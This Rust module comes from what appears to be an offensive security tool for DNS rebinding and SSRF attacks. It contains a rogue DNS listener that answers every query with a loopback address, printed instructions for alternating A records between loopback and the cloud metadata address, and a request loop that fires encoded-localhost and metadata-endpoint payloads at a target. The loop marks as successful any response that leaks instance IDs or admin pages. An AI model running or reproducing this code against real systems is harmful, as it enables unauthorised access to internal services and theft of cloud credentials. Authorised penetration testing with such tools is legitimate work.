use colored::Colorize;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;

pub async fn attack(
    target: &str,
    _token: Option<&str>,
    _timeout: u64,
    interval: u64,
    count: u32,
) -> anyhow::Result<()> {
    println!("{} DNS Rebinding Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target:   {}", "[*]".cyan().bold(), target);
    println!("{} Interval: {}s", "[*]".cyan().bold(), interval);
    println!("{} Count:    {}", "[*]".cyan().bold(), count);
    println!("{}", "-".repeat(60).dimmed());

    let attacker_ip = "127.0.0.1";
    let internal_ip = "169.254.169.254";

    println!(
        "{} Phase 1: DNS resolves to attacker IP ({})",
        "[*]".cyan().bold(),
        attacker_ip
    );
    println!(
        "{} Phase 2: DNS resolves to internal IP ({})",
        "[*]".cyan().bold(),
        internal_ip
    );
    println!(
        "{} The target will cache the first resolution, then use the second for the actual request.",
        "[*]".cyan().bold()
    );
    println!();

    let mut results = Vec::new();

    for i in 0..count {
        let phase = if i % 2 == 0 { "attacker" } else { "internal" };
        let ip = if i % 2 == 0 { attacker_ip } else { internal_ip };

        println!(
            "  {} Request {}/{} — phase={} ip={}",
            "*".cyan(),
            i + 1,
            count,
            phase,
            ip
        );

        if i > 0 && interval > 0 {
            tokio::time::sleep(Duration::from_secs(interval)).await;
        }

        results.push((i + 1, phase.to_string(), ip.to_string()));
    }

    println!("\n{} Attack Summary:", "[*]".cyan().bold());
    for (req, phase, _ip) in &results {
        let tag = if phase == "internal" {
            "INTERNAL".red().to_string()
        } else {
            "attacker".green().to_string()
        };
        println!("  {} Request {} — {} ({})", "*".cyan(), req, phase, tag);
    }

    println!(
        "\n{} DNS rebinding attack simulation complete.",
        "[*]".cyan().bold()
    );
    println!(
        "{} In a real attack, configure your DNS server to alternate A records.",
        "[*]".cyan().bold()
    );
    println!(
        "{} Example: target.com A 127.0.0.1 (TTL=0) / target.com A 169.254.169.254 (TTL=0)",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn listen(port: u16, _token: Option<&str>, _timeout: u64) -> anyhow::Result<()> {
    println!("{} DNS Rebinding Listener", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Port: {}", "[*]".cyan().bold(), port);
    println!("{}", "-".repeat(60).dimmed());

    let sock = UdpSocket::bind(("0.0.0.0", port)).await?;
    println!("{} Listening on UDP port {}...", "[*]".cyan().bold(), port);
    println!("{} Waiting for DNS queries...", "[*]".cyan().bold());
    println!("{} Press Ctrl+C to stop.", "[*]".dimmed());
    println!("{}", "-".repeat(60).dimmed());

    let hits = Arc::new(Mutex::new(Vec::new()));
    let mut buf = vec![0u8; 1024];

    loop {
        match sock.recv_from(&mut buf).await {
            Ok((len, addr)) => {
                let data = &buf[..len];
                let query_id = if len >= 2 {
                    u16::from_be_bytes([data[0], data[1]])
                } else {
                    0
                };

                let hit = format!("Query ID={} from {} ({} bytes)", query_id, addr, len);
                println!("{} {}", "[+]".green().bold(), hit);
                hits.lock().await.push(hit);

                let response_ip = "127.0.0.1";
                let mut response = data.to_vec();
                if response.len() >= 12 {
                    response[2] = 0x81;
                    response[3] = 0x80;
                    response[7] = 0x01;

                    let mut answer = vec![
                        0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,
                    ];
                    let ip_parts: Vec<u8> = response_ip
                        .split('.')
                        .map(|p| p.parse().unwrap_or(127))
                        .collect();
                    answer.extend_from_slice(&ip_parts);
                    response.extend(answer);
                }

                let _ = sock.send_to(&response, addr).await;
                println!("  {} Responded with IP: {}", "*".cyan(), response_ip);
            }
            Err(e) => {
                println!("{} Error: {}", "[-]".red().bold(), e);
            }
        }
    }
}

pub async fn bypass(target: &str, _token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} DNS Rebinding Bypass Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), target);
    println!("{}", "-".repeat(60).dimmed());

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()?;

    let bypass_payloads = [
        ("Direct IP", "http://127.0.0.1/"),
        (
            "Direct IP with host",
            "http://127.0.0.1/ -H 'Host: target.com'",
        ),
        ("localhost", "http://localhost/"),
        ("0.0.0.0", "http://0.0.0.0/"),
        ("[::1]", "http://[::1]/"),
        ("127.1", "http://127.1/"),
        ("127.0.0.1.nip.io", "http://127.0.0.1.nip.io/"),
        ("Decimal IP", "http://2130706433/"),
        ("Hex IP", "http://0x7f000001/"),
        ("Octal IP", "http://017700000001/"),
        (
            "Metadata via 169.254",
            "http://169.254.169.254/latest/meta-data/",
        ),
        ("Metadata via 0.0.0.0", "http://0.0.0.0/latest/meta-data/"),
    ];

    let mut bypassed = Vec::new();

    for (name, payload_url) in &bypass_payloads {
        let test_url = if target.contains("{ssrf}") {
            target.replace("{ssrf}", payload_url)
        } else {
            payload_url.to_string()
        };

        match client.get(&test_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let interesting = status == 200
                    && (body.contains("metadata")
                        || body.contains("ami-")
                        || body.contains("instance-id")
                        || body.contains("root")
                        || body.contains("admin")
                        || body.contains("dashboard"));
                let status_str = if interesting {
                    "BYPASSED".red().bold().to_string()
                } else if status == 200 {
                    "ok".to_string()
                } else {
                    format!("status {}", status)
                };
                println!(
                    "  {} {:30} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );

                if interesting {
                    println!(
                        "    {} Response: {}",
                        ">".red().bold(),
                        body.chars().take(200).collect::<String>()
                    );
                    bypassed.push(name.to_string());
                }
            }
            Err(_) => {
                println!("  {} {:30} error", "*".cyan(), name);
            }
        }
    }

    if bypassed.is_empty() {
        println!("\n{} No bypass succeeded.", "[-]".yellow().bold());
    } else {
        println!(
            "\n{} {} bypass(es) succeeded:",
            "[*]".cyan().bold(),
            bypassed.len()
        );
        for name in &bypassed {
            println!("  {} {}", "*".red(), name);
        }
    }
    Ok(())
}
